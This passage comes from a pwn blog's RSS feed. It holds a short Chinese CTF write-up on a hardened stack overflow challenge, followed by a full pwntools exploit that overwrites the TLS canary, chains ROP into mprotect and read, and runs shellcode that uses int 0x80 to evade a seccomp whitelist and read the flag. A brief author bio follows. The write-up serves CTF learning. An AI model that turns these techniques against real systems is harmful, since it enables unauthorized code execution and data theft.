<p>保护全开的栈溢出，绕过canary的方法为直接修改tls里canary的值</p>
<p>之后rop调用mprotect写修改权限然后sys read写shellcode</p>
<p>之后再写的shellcode里利用int 0x80来绕过seccomp白名单</p>
<blockquote>
<p>需要注意的是，这题flag文件名未知，需要调用getents来获得文件名</p>
</blockquote>
<h2 id="x02-exp">0x02 exp</h2>
<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb1-1" title="1"><span class="co"># -*- coding: utf-8 -*-</span></a>
<a class="sourceLine" id="cb1-2" title="2"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
<a class="sourceLine" id="cb1-3" title="3">context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</a>
<a class="sourceLine" id="cb1-4" title="4">context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></a>
<a class="sourceLine" id="cb1-5" title="5">libc <span class="op">=</span> ELF(<span class="st">&#39;./libc-2.34.so&#39;</span>)</a>
<a class="sourceLine" id="cb1-6" title="6">elf <span class="op">=</span> ELF(<span class="st">&quot;./setup&quot;</span>)</a>
<a class="sourceLine" id="cb1-7" title="7"></a>
<a class="sourceLine" id="cb1-8" title="8">local <span class="op">=</span> <span class="dv">1</span></a>
<a class="sourceLine" id="cb1-9" title="9"></a>
<a class="sourceLine" id="cb1-10" title="10"><span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb1-11" title="11">    p <span class="op">=</span> process(<span class="st">&quot;./setup&quot;</span>)    </a>
<a class="sourceLine" id="cb1-12" title="12"><span class="cf">else</span>:</a>
<a class="sourceLine" id="cb1-13" title="13">    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</a>
<a class="sourceLine" id="cb1-14" title="14"></a>
<a class="sourceLine" id="cb1-15" title="15"><span class="kw">def</span> debug(p,cmd<span class="op">=</span><span class="st">&quot;&quot;</span>):</a>
<a class="sourceLine" id="cb1-16" title="16">    <span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb1-17" title="17">        gdb.attach(p,cmd)</a>
<a class="sourceLine" id="cb1-18" title="18">    <span class="cf">else</span>:</a>
<a class="sourceLine" id="cb1-19" title="19">        <span class="cf">pass</span></a>
<a class="sourceLine" id="cb1-20" title="20"></a>
<a class="sourceLine" id="cb1-21" title="21"></a>
<a class="sourceLine" id="cb1-22" title="22">p.sendlineafter(<span class="st">&quot;&gt;&quot;</span>, <span class="st">&quot;1&quot;</span>)</a>
<a class="sourceLine" id="cb1-23" title="23">p.sendlineafter(<span class="st">&quot;to:&quot;</span>, <span class="st">&quot;a&quot;</span><span class="op">*</span><span class="bn">0x18</span>)</a>
<a class="sourceLine" id="cb1-24" title="24">p.sendlineafter(<span class="st">&quot;&gt;&quot;</span>, <span class="st">&quot;1&quot;</span>)</a>
<a class="sourceLine" id="cb1-25" title="25"></a>
<a class="sourceLine" id="cb1-26" title="26">p.recvuntil(<span class="st">&quot;a&quot;</span><span class="op">*</span><span class="bn">0x18</span>)</a>
<a class="sourceLine" id="cb1-27" title="27">libc.address <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span><span class="bn">0x22aa0a</span></a>
<a class="sourceLine" id="cb1-28" title="28">log.info(<span class="st">&quot;libc_base ==&gt;&quot;</span><span class="op">+</span><span class="bu">hex</span>(libc.address))</a>
<a class="sourceLine" id="cb1-29" title="29">tls_canary <span class="op">=</span> libc.address <span class="op">-</span> <span class="bn">0x2898</span></a>
<a class="sourceLine" id="cb1-30" title="30">log.info(<span class="st">&quot;tls_canary ==&gt;&quot;</span><span class="op">+</span><span class="bu">hex</span>(tls_canary))</a>
<a class="sourceLine" id="cb1-31" title="31">pop_rax <span class="op">=</span> <span class="bn">0x0000000000049f10</span> <span class="op">+</span> libc.address</a>
<a class="sourceLine" id="cb1-32" title="32">pop_rdx <span class="op">=</span> <span class="bn">0x0000000000120272</span> <span class="op">+</span> libc.address</a>
<a class="sourceLine" id="cb1-33" title="33">pop_rdi <span class="op">=</span> <span class="bn">0x000000000002e6c5</span> <span class="op">+</span> libc.address</a>
<a class="sourceLine" id="cb1-34" title="34">pop_rsi <span class="op">=</span> <span class="bn">0x0000000000030081</span> <span class="op">+</span> libc.address</a>
<a class="sourceLine" id="cb1-35" title="35">syscall <span class="op">=</span> <span class="bn">0x0000000000095196</span> <span class="op">+</span> libc.address</a>
<a class="sourceLine" id="cb1-36" title="36"></a>
<a class="sourceLine" id="cb1-37" title="37">payload <span class="op">=</span> flat(</a>
<a class="sourceLine" id="cb1-38" title="38">    tls_canary,</a>
<a class="sourceLine" id="cb1-39" title="39">    <span class="st">&#39;A&#39;</span><span class="op">*</span><span class="bn">0x58</span>,</a>
<a class="sourceLine" id="cb1-40" title="40">    pop_rdi, <span class="dv">0</span>,</a>
<a class="sourceLine" id="cb1-41" title="41">    syscall</a>
<a class="sourceLine" id="cb1-42" title="42">)</a>
<a class="sourceLine" id="cb1-43" title="43"></a>
<a class="sourceLine" id="cb1-44" title="44">p.sendafter(<span class="st">&quot;name:&quot;</span>, payload)</a>
<a class="sourceLine" id="cb1-45" title="45">payload <span class="op">=</span> flat(</a>
<a class="sourceLine" id="cb1-46" title="46">    <span class="st">&#39;A&#39;</span><span class="op">*</span><span class="dv">8</span>,</a>
<a class="sourceLine" id="cb1-47" title="47">    <span class="st">&#39;C&#39;</span><span class="op">*</span><span class="bn">0x21d0</span>,</a>
<a class="sourceLine" id="cb1-48" title="48">)</a>
<a class="sourceLine" id="cb1-49" title="49">payload <span class="op">+=</span> flat(</a>
<a class="sourceLine" id="cb1-50" title="50">    <span class="co"># mprotect</span></a>
<a class="sourceLine" id="cb1-51" title="51">    pop_rax, <span class="bn">0xa</span>,</a>
<a class="sourceLine" id="cb1-52" title="52">    pop_rdi, libc.address <span class="op">+</span> <span class="bn">0x21a000</span>,</a>
<a class="sourceLine" id="cb1-53" title="53">    pop_rsi, <span class="bn">0x1000</span>,</a>
<a class="sourceLine" id="cb1-54" title="54">    pop_rdx, <span class="dv">7</span>,</a>
<a class="sourceLine" id="cb1-55" title="55">    syscall,</a>
<a class="sourceLine" id="cb1-56" title="56"></a>
<a class="sourceLine" id="cb1-57" title="57">    <span class="co"># read(0,libc.address + 0x21a000,0x1000)</span></a>
<a class="sourceLine" id="cb1-58" title="58">    pop_rdi, <span class="dv">0</span>,</a>
<a class="sourceLine" id="cb1-59" title="59">    pop_rsi, libc.address <span class="op">+</span> <span class="bn">0x21a800</span>,</a>
<a class="sourceLine" id="cb1-60" title="60">    pop_rdx, <span class="bn">0x1000</span>,</a>
<a class="sourceLine" id="cb1-61" title="61">    pop_rax, <span class="dv">0</span>,</a>
<a class="sourceLine" id="cb1-62" title="62">    syscall,</a>
<a class="sourceLine" id="cb1-63" title="63"></a>
<a class="sourceLine" id="cb1-64" title="64">    <span class="co"># exec shellcode</span></a>
<a class="sourceLine" id="cb1-65" title="65">    libc.address <span class="op">+</span> <span class="bn">0x21a801</span></a>
<a class="sourceLine" id="cb1-66" title="66">)</a>
<a class="sourceLine" id="cb1-67" title="67"></a>
<a class="sourceLine" id="cb1-68" title="68"></a>
<a class="sourceLine" id="cb1-69" title="69">debug(p,<span class="st">&quot;b *&quot;</span><span class="op">+</span><span class="bu">hex</span>(libc.address <span class="op">+</span> <span class="bn">0x21a800</span>))</a>
<a class="sourceLine" id="cb1-70" title="70"><span class="co"># pause()</span></a>
<a class="sourceLine" id="cb1-71" title="71">p.sendafter(<span class="st">&quot;Data:&quot;</span>, payload)</a>
<a class="sourceLine" id="cb1-72" title="72">shellcode <span class="op">=</span> asm(<span class="st">&quot;&quot;&quot;</span></a>
<a class="sourceLine" id="cb1-73" title="73"><span class="st">    // x86  arg[0]=ebx arg[1]=ecx arg[2]=edx arg[3]=esi arg[4]=edi  arg[5]=ebp</span></a>
<a class="sourceLine" id="cb1-74" title="74"><span class="st">    //  mmap2(0x500000, 0x5000, 3, 1048610, 0, 0)</span></a>
<a class="sourceLine" id="cb1-75" title="75"><span class="st">    mov rax, 0xc0</span></a>
<a class="sourceLine" id="cb1-76" title="76"><span class="st">    mov rbx, 0x500000</span></a>
<a class="sourceLine" id="cb1-77" title="77"><span class="st">    mov rcx, 0x5000</span></a>
<a class="sourceLine" id="cb1-78" title="78"><span class="st">    mov rdx, 3</span></a>
<a class="sourceLine" id="cb1-79" title="79"><span class="st">    mov rsi, 1048610</span></a>
<a class="sourceLine" id="cb1-80" title="80"><span class="st">    xor rdi, rdi</span></a>
<a class="sourceLine" id="cb1-81" title="81"><span class="st">    xor rbp, rbp</span></a>
<a class="sourceLine" id="cb1-82" title="82"><span class="st">    int 0x80</span></a>
<a class="sourceLine" id="cb1-83" title="83"></a>
<a class="sourceLine" id="cb1-84" title="84"><span class="st">    mov rsp,0x500a00</span></a>
<a class="sourceLine" id="cb1-85" title="85"></a>
<a class="sourceLine" id="cb1-86" title="86"><span class="st">    // 5 ==&gt; 64bit:fstat   32bit:open</span></a>
<a class="sourceLine" id="cb1-87" title="87"><span class="st">    // open(&quot;.&quot;, 0, 0)</span></a>
<a class="sourceLine" id="cb1-88" title="88"><span class="st">    mov rax, 5</span></a>
<a class="sourceLine" id="cb1-89" title="89"><span class="st">    push 0x2e </span></a>
<a class="sourceLine" id="cb1-90" title="90"><span class="st">    mov rbx, rsp</span></a>
<a class="sourceLine" id="cb1-91" title="91"><span class="st">    xor rcx, rcx</span></a>
<a class="sourceLine" id="cb1-92" title="92"><span class="st">    int 0x80</span></a>
<a class="sourceLine" id="cb1-93" title="93"></a>
<a class="sourceLine" id="cb1-94" title="94"><span class="st">    // getents(fd1, $rsp, 0x1337)</span></a>
<a class="sourceLine" id="cb1-95" title="95"><span class="st">    mov rbx, rax</span></a>
<a class="sourceLine" id="cb1-96" title="96"><span class="st">    mov rax, 0x8d</span></a>
<a class="sourceLine" id="cb1-97" title="97"><span class="st">    mov rcx, rsp</span></a>
<a class="sourceLine" id="cb1-98" title="98"><span class="st">    mov rdx, 0x1337</span></a>
<a class="sourceLine" id="cb1-99" title="99"><span class="st">    int 0x80</span></a>
<a class="sourceLine" id="cb1-100" title="100"></a>
<a class="sourceLine" id="cb1-101" title="101"><span class="st">    // rsp+0x7e ==&gt;  flag.txt</span></a>
<a class="sourceLine" id="cb1-102" title="102"><span class="st">    mov rbx, rsp</span></a>
<a class="sourceLine" id="cb1-103" title="103"><span class="st">    add rbx, 0x7e</span></a>
<a class="sourceLine" id="cb1-104" title="104"></a>
<a class="sourceLine" id="cb1-105" title="105"><span class="st">    // open</span></a>
<a class="sourceLine" id="cb1-106" title="106"><span class="st">    mov rax, 5</span></a>
<a class="sourceLine" id="cb1-107" title="107"><span class="st">    xor rcx, rcx</span></a>
<a class="sourceLine" id="cb1-108" title="108"><span class="st">    xor rdx, rdx</span></a>
<a class="sourceLine" id="cb1-109" title="109"><span class="st">    int 0x80</span></a>
<a class="sourceLine" id="cb1-110" title="110"></a>
<a class="sourceLine" id="cb1-111" title="111"><span class="st">    // RW</span></a>
<a class="sourceLine" id="cb1-112" title="112"><span class="st">    mov rdi, rax</span></a>
<a class="sourceLine" id="cb1-113" title="113"><span class="st">    mov rsi, rsp</span></a>
<a class="sourceLine" id="cb1-114" title="114"><span class="st">    mov rdx, 0x100</span></a>
<a class="sourceLine" id="cb1-115" title="115"><span class="st">    xor rax, rax</span></a>
<a class="sourceLine" id="cb1-116" title="116"><span class="st">    syscall</span></a>
<a class="sourceLine" id="cb1-117" title="117"></a>
<a class="sourceLine" id="cb1-118" title="118"><span class="st">    mov rdi, 1</span></a>
<a class="sourceLine" id="cb1-119" title="119"><span class="st">    mov rax, 1</span></a>
<a class="sourceLine" id="cb1-120" title="120"><span class="st">    syscall</span></a>
<a class="sourceLine" id="cb1-121" title="121"><span class="st">&quot;&quot;&quot;</span>, arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</a>
<a class="sourceLine" id="cb1-122" title="122">sleep(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb1-123" title="123">p.sendafter(b<span class="st">&#39;Hello World Setup Wizard</span><span class="ch">\n\x1b</span><span class="st">[0m&#39;</span>, <span class="st">&#39;</span><span class="ch">\x90</span><span class="st">&#39;</span><span class="op">+</span>shellcode)</a>
<a class="sourceLine" id="cb1-124" title="124"></a>
<a class="sourceLine" id="cb1-125" title="125"><span class="co"># debug(p)</span></a>
<a class="sourceLine" id="cb1-126" title="126">p.interactive()</a></code></pre></div>]]></description>
    <pubDate>Tue, 11 Oct 2022 16:59:01 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[ 关于我]]></title>
    <link>https://blog.mark0519.com/#//#/about</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/about</guid>
    <description><![CDATA[<h2 id="关于我">关于我</h2>
<blockquote>
<p>About me</p>
</blockquote>
<p>Mark / Mark0519 / M4rk，Pwner@天枢Duble</p>
<h2 id="联系我">联系我</h2>
<blockquote>
<p>Contact me</p>
</blockquote>
<p><a href="https://github.com/mark0519">Github</a></p>
<p><a href="mailto:sunjiajun@bupt.edu.cn">E-mail</a></p>]]></description>
    <pubDate>Sun, 9 Oct 2022 13:29:19 +0800</pubDate>
  </item>
  
</channel>
</rss>
